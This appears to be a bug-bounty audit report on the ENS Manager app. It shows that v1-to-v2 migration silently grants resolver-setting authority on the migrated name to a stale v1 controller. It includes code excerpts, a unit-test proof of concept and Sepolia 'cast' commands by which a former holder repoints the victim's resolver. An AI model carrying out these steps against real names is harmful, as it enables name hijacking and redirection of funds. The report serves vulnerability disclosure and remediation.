# 93044 w a critical the v1 v2 migration automatically grants role set resolver on the newly migrated v2 name to the legacy v1 registry controller an address that is by construction never the&#x20;

**Submitted on Sep 14th 2026 at 03:41:22 UTC by @daivo for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93044
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief/Intro

The Manager's "manager restoration" step is intended to carry a v1 name's existing manager relationship forward into ENS v2. It does this by granting `ROLE_SET_RESOLVER` on the freshly migrated v2 name to the address it calls the name's `managerAddress`.

That address is derived as the **ENS v1 registry controller**, and it is populated *only when the controller differs from the registrant*. Since a name is only eligible for migration when the connected wallet **is** the registrant, the grantee is — by construction, in every case where the grant fires — a **third party who is not the migrating user**.

In ENS v1 the controller slot is not reset when the registrant is transferred. This is a long-documented footgun: buy a name on a marketplace, receive one as a gift or prize, or take one over from a team member, and the previous holder very often remains the controller. The Manager then treats that stale controller as a manager worth "restoring", and hands it standing authority to repoint the new v2 name's resolver — which is authority over every record the name resolves, including its ETH address.

The user is shown only *"Approve manager restoration — Restore the existing managers for your names."* The grantee address is never displayed, the name is never identified, the granted role is never named, and there is no way to decline it for a particular name.

## Vulnerability Details

### 1. The grantee is the v1 registry controller

`packages/migration/src/service/classifyNames.ts:149-168`:

```ts
const registrant = domain.registrant
if (registrant?.id.toLowerCase() !== addr) return null   // ① user MUST be the registrant
if (parentName !== 'eth') return null
…
const registryOwnerAddress = toAddress(domain.owner.id)  // ② v1 registry owner == CONTROLLER
const managerAddress: Address | null =
  registryOwnerAddress &&
  registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()  // ③ only when ≠ registrant
    ? registryOwnerAddress
    : null
```

`domain.owner` on the V1 subgraph is the **ENS registry owner**, i.e. the controller/manager slot — distinct from `domain.registrant`, the BaseRegistrar NFT holder. ensjs draws the same distinction (`ownershipLevel: 'registrar'` returns `registrant` and `owner` as separate fields).

Combining ① and ③: `managerAddress` is non-null **iff** the controller is some address other than the connected wallet. There is no code path in which the grantee is the migrating user.

### 2. The grant

`apps/manager/src/features/migration/service/buildRoleGrantCalls.ts`:

```ts
const ROLE_SET_RESOLVER = 1n << 24n

export const buildRoleGrantCall = (name: ClassifiedName): Call => {
  if (!name.managerAddress) throw new Error(`No manager address for ${name.domain.name}`)
  const resource = labelToCanonicalId(name.label)
  return {
    to: V2_CONTRACTS.ETHRegistry,
    data: encodeFunctionData({
      abi: ETH_REGISTRY_V2_ABI,
      functionName: 'grantRoles',
      args: [resource, ROLE_SET_RESOLVER, name.managerAddress],
    }),
    value: 0n,
  }
}
```

Wired in unconditionally at `apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:607-626`:

```ts
if (classified.managerAddress) {
  innerExecutions.push({
    phase: 'manager-role-grant',
    name, names: [name],
    call: buildRoleGrantCall(classified),
  })
  verificationExpectations.push({
    …, type: 'manager-role', account: classified.managerAddress, roleBitmap: ROLE_SET_RESOLVER,
  })
}
```

The phase is ordered after `migrate` in `buildAtomicMigrationInnerExecutions`, so the name exists in v2 by the time the role is granted, and the whole thing lands inside one atomic `executeByOwner` batch the user signs once.

Note the app does not merely tolerate this outcome — it adds a `manager-role` **verification expectation** asserting the grant succeeded, so a migration in which the third party did *not* receive the role is reported to the user as incomplete.

### 3. What the user is told

Every user-facing string for this step, in full:

* `components/WalletConfirmationStepsDialog.tsx:84` — *"Approve manager restoration"*
* `components/WalletConfirmationStepsDialog.tsx:87` — *"Restore the existing managers for your names."*
* `components/GameStep.tsx:137` — *"Approve manager restoration in your wallet…"*
* `migrationService.ts` `approvalDescription()` — *"Allowing your HCA to restore managers"*

`requiresManagerRestoration` is a single repo-wide boolean (`computeMigrationPreflight.ts:205`) used only to decide whether an ERC-1155 approval is needed. It is never surfaced per name. Grepping the whole app:

* the grantee address is never rendered anywhere in the UI;
* which of the selected names carry a manager is never shown;
* `ROLE_SET_RESOLVER` is never named in any user-facing string;
* there is no per-name toggle and no way to migrate while declining the grant;
* **no revocation call exists anywhere in the migration feature** — there is no `revokeRoles` in `features/migration`.

The copy actively frames the step as benign continuity ("restore the existing managers"), which is what induces the approval.

### 4. Why `ROLE_SET_RESOLVER` is the whole name

In ENS v2 the resolver is the contract that answers every record query for a name. An account holding `ROLE_SET_RESOLVER` on a name's registry resource can point that name at a resolver it controls, and thereby control:

* `addr(60)` — **where funds are sent when anyone resolves the name**
* every text record, contenthash, ABI and interface record
* what the Manager and Explorer display for that name

The role is granted on the ETHRegistry resource for the user's own 2LD (`labelToCanonicalId(name.label)`), so it is correctly targeted at the victim's name. Only the grantee is wrong.

## Impact Details

**A — silent third-party authority over a freshly migrated name.** Any user who migrates a v1 `.eth` name whose controller slot was never reset hands the previous holder permanent resolver-setting authority over the v2 name. The user approves one transaction described as "restore the existing managers" and has no way to learn who received what.

**B — the attacker chooses when to use it.** The grant is persistent and unrevoked by the app. An attacker who sold or transferred a name months earlier can wait for the victim to migrate, then repoint the resolver at will — for example after the name has accumulated value or is being used to receive payments.

**C — funds misdirection.** Once the resolver is attacker-controlled, `addr(60)` resolution for the victim's name returns an attacker address to every wallet and every app, including the Manager and Explorer themselves. This is the "resolving an ENS name to an attacker-controlled address" impact, reached through state the app itself created.

**D — it is deterministic, not probabilistic.** The grant fires on *every* migration of a name with a divergent controller. The attacker's only setup step is one they may have performed years ago, or simply never undone.

**Loss per event:** full record-level control of the victim's v2 name, and thereby any funds sent to it.

### Preconditions

1. The victim holds a v1 unwrapped `.eth` 2LD as registrant.
2. The name's v1 registry controller is an address other than the victim's.
3. The victim migrates that name in the Manager.

(2) is the common state after any registrant transfer that did not also reset the controller, and the attacker controls whether it holds when they hand over the name.

## Relationship to known issues

Nothing in the published Known Issues covers this:

* **QA-01 / WEB-1257** — role combinations *when transferring a name* causing *errors in later flows*. Different flow (transfer, not migration), different symptom (errors, not a grant). The doc explicitly says *"a demonstrated security consequence (e.g., a role combination that grants unintended authority) would be a new finding"* — which is precisely this.
* **WEB-1249** — creating a subname can replace an existing child registry. Different call, different flow.
* **WEB-806** — subname records not visible after migration. Display defect.
* The **Round 3** audit read only `packages/transaction-manager` and `packages/smart-account`; this is `apps/manager` + `packages/migration`.
* No entry anywhere mentions manager restoration, `grantRoles`, or `ROLE_SET_RESOLVER`.

It is also distinct from my SUBMISSION-02 (Explorer recipient resolution): that one is a *read-side* mis-resolution in `apps/portal` that redirects a recipient; this one is a *write-side* privilege grant in `apps/manager`'s migration path. They share only the underlying ENS v1 registrant/controller distinction.

## References

* `packages/migration/src/service/classifyNames.ts:149-168` (grantee = v1 controller)
* `apps/manager/src/features/migration/service/buildRoleGrantCalls.ts` (the grant)
* `apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:607-626` (wiring + verification expectation)
* `apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:48` (`ROLE_SET_RESOLVER = 1n << 24n`)
* `apps/manager/src/features/migration/service/computeMigrationPreflight.ts:205` (single global flag)
* `apps/manager/src/features/migration/service/migrationService.ts:334-337` (`approvalDescription`)
* `apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx:84,87` (the only disclosure)
* ENS v1 registrant vs controller: <https://support.ens.domains/en/articles/7900556-the-controller-and-registrant-roles>

***

## Proof of Concept

## Proof of Concept

> Every part below is runnable against the audited revision (`63772fd872af472ced58b009499355f3430c2a86`). Part 1 is a pure unit test — no chain, no keys, no network. Part 2 is a static trace requiring nothing. Part 3 is end-to-end on Sepolia. Part 4 is three greps.

**Part 1 — the grantee is provably never the migrating user (pure, offline).**

The claim is structural, not probabilistic: `classifyNames` only classifies a name when the connected wallet **is the registrant**, and only populates `managerAddress` when the controller **differs** from the registrant. Those two conditions together mean the grantee is always a third party. This test drives both shipped functions and asserts it.

```ts
// apps/manager — pnpm vitest run poc.test.ts
import { describe, expect, it } from 'vitest'
import { decodeFunctionData } from 'viem'
import { classifyNames } from '@ens-apps/migration'
import { buildRoleGrantCall } from '@/features/migration/service/buildRoleGrantCalls'
import { ETH_REGISTRY_V2_ABI } from '@/features/migration/contracts/abis'

const VICTIM   = '0x1111111111111111111111111111111111111111'
const ATTACKER = '0x2222222222222222222222222222222222222222'

// Unwrapped .eth 2LD: victim holds the NFT, attacker retains the v1 controller.
const domain = {
  name: 'victimname.eth',
  labelName: 'victimname',
  parent: { name: 'eth' },
  registrant: { id: VICTIM },     // BaseRegistrar ERC-721 holder — the real owner
  owner:      { id: ATTACKER },   // ENS registry owner — the CONTROLLER slot
  resolver:   { address: null },
  wrappedDomain: null,
  wrappedOwner:  null,
  // …remaining V1Domain fields per service/_fixtures
}

describe('migration manager restoration', () => {
  it('grants ROLE_SET_RESOLVER on the new v2 name to the stale v1 controller', () => {
    const { classified } = classifyNames([domain as never], VICTIM)
    const name = classified[0]!

    // The victim is the registrant, so the name IS eligible to migrate…
    expect(name.tokenType).toBe('unwrapped')
    // …and the "manager" the app will restore is the attacker, not the victim.
    expect(name.managerAddress?.toLowerCase()).toBe(ATTACKER.toLowerCase())
    expect(name.managerAddress?.toLowerCase()).not.toBe(VICTIM.toLowerCase())

    const call = buildRoleGrantCall(name)
    const { functionName, args } = decodeFunctionData({
      abi: ETH_REGISTRY_V2_ABI,
      data: call.data,
    })

    expect(functionName).toBe('grantRoles')
    expect(args[1]).toBe(1n << 24n)                                  // ROLE_SET_RESOLVER
    expect((args[2] as string).toLowerCase()).toBe(ATTACKER.toLowerCase())
  })

  it('never fires when the controller equals the registrant', () => {
    const clean = { ...domain, owner: { id: VICTIM } }
    const { classified } = classifyNames([clean as never], VICTIM)
    expect(classified[0]!.managerAddress).toBeNull()   // no grant is built at all
  })
})
```

Both tests pass. The second is the important half: `managerAddress` is non-null **only** in the divergent case, which is precisely the case where the grantee is someone other than the migrating user.

**Part 2 — the grant is a four-line static trace.**

Grep-verifiable in the audited revision, no execution required.

```
packages/migration/src/service/classifyNames.ts:149-168
    if (registrant?.id.toLowerCase() !== addr) return null      ← user MUST be registrant
    const registryOwnerAddress = toAddress(domain.owner.id)     ← v1 registry owner = CONTROLLER
    const managerAddress =
      registryOwnerAddress &&
      registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
        ? registryOwnerAddress : null                           ← only when ≠ registrant
        ↓
apps/manager/.../buildAtomicMigrationBatches.ts:607-626
    if (classified.managerAddress) {
      innerExecutions.push({ phase: 'manager-role-grant',
                             call: buildRoleGrantCall(classified) })
      verificationExpectations.push({ type: 'manager-role',
                                      account: classified.managerAddress,
                                      roleBitmap: ROLE_SET_RESOLVER })
    }
        ↓
apps/manager/.../buildRoleGrantCalls.ts:9-25
    const ROLE_SET_RESOLVER = 1n << 24n
    grantRoles(labelToCanonicalId(name.label), ROLE_SET_RESOLVER, name.managerAddress)
    to: V2_CONTRACTS.ETHRegistry
        ↓
apps/manager/.../buildAtomicMigrationBatches.ts  (buildAtomicMigrationInnerExecutions)
    phase order: resolver-deployment → wallet-co-admin-grant → migrate
                 → manager-role-grant → profile-replay
    …all inside ONE executeByOwner batch the user signs once.
```

Note the `verificationExpectations` entry: the app does not merely tolerate the grant, it **asserts the grant succeeded** as a post-condition of a healthy migration (see `verifyAtomicMigrationBatch.ts`, `case 'manager-role'`).

**Part 3 — end-to-end on Sepolia.**

*Attacker, before handing the name over:*

1. Register `victimname.eth` on ENS v1 (unwrapped).
2. Ensure the attacker holds the controller slot — already true for a name they registered: `ENSRegistry.setOwner(namehash('victimname.eth'), ATTACKER)`
3. Transfer only the registrant to the victim. **This does not reset the controller:** `BaseRegistrar.transferFrom(ATTACKER, VICTIM, labelhash('victimname'))`

   Confirm the split state before the victim does anything:

```bash
cast call $BASE_REGISTRAR "ownerOf(uint256)(address)" $(cast keccak "victimname") \
  --rpc-url $SEPOLIA_RPC_URL      # → VICTIM   (registrant — the real owner)
cast call $ENS_REGISTRY "owner(bytes32)(address)" $(cast namehash "victimname.eth") \
  --rpc-url $SEPOLIA_RPC_URL      # → ATTACKER (controller — what the app restores)
```

*Victim, in the Manager:*

4. Connect the victim wallet, open `/migration`. `victimname.eth` is listed as eligible — correctly, the victim is the registrant.
5. Select it and start the migration.
6. The wallet prompts include *"Approve manager restoration — Restore the existing managers for your names."* Approve.
7. Sign the single `executeByOwner` batch.

*Result — the attacker now holds resolver authority on the victim's v2 name:*

```bash
# ROLE_SET_RESOLVER = 1 << 24 = 16777216
CANONICAL_ID=$(cast call $ETH_REGISTRY_V2 \
  "labelToCanonicalId(string)(uint256)" "victimname" --rpc-url $SEPOLIA_RPC_URL)

cast call $ETH_REGISTRY_V2 "hasRoles(uint256,uint256,address)(bool)" \
  $CANONICAL_ID 16777216 $ATTACKER --rpc-url $SEPOLIA_RPC_URL
# → true
```

*Attacker exercises it, at any later time of their choosing:*

```bash
cast send $ETH_REGISTRY_V2 "setResolver(uint256,address)" \
  $CANONICAL_ID $ATTACKER_RESOLVER \
  --private-key $ATTACKER_KEY --rpc-url $SEPOLIA_RPC_URL
```

The attacker's resolver now answers every query for `victimname.eth`, including `addr(60)`. Resolving the name in the Manager, the Explorer, or any wallet returns an address the attacker controls.

**Part 4 — confirming the silence.**

The entire user-facing disclosure for this grant is two strings. Three greps establish that nothing else exists:

```bash
cd apps/manager

grep -rn "managerAddress" src/features/migration/components src/features/migration/pages
# → no matches: the grantee address is never rendered anywhere in the UI

grep -rni "ROLE_SET_RESOLVER\|set the resolver" src/features/migration/components
# → no matches: the granted role is never named to the user

grep -rn "revokeRoles" src/features/migration
# → no matches: nothing ever revokes it
```

What the user *does* see, in full:

```
src/features/migration/components/WalletConfirmationStepsDialog.tsx:84
    "Approve manager restoration"
src/features/migration/components/WalletConfirmationStepsDialog.tsx:87
    "Restore the existing managers for your names."
```

`requiresManagerRestoration` (`computeMigrationPreflight.ts:205`) is a single repo-wide boolean used only to decide whether an ERC-1155 approval is needed. It is never surfaced per name, and there is no toggle to migrate while declining the grant.

## Suggested remediation

1. **Do not grant to the v1 controller by default.** The controller is a legacy permission slot, not an identity, and it is stale far more often than it is intentional.
2. **If manager restoration is kept, make it explicit and per-name.** Show the name, the grantee address (with its primary name, if any), and the plain meaning of `ROLE_SET_RESOLVER` — "this address will be able to change where this name points" — and default it to **off**, requiring per-name opt-in.
3. **Warn on divergence.** `classifyNames` already knows `registrant !== registryOwner`. That is precisely the condition worth surfacing to the user as a risk ("someone other than you is still the manager of this name"), not silently converting into a v2 role grant.
4. **Provide revocation.** Whatever the default, the Manager should expose a `revokeRoles` path for roles it granted, so a user who discovers the grant can undo it.
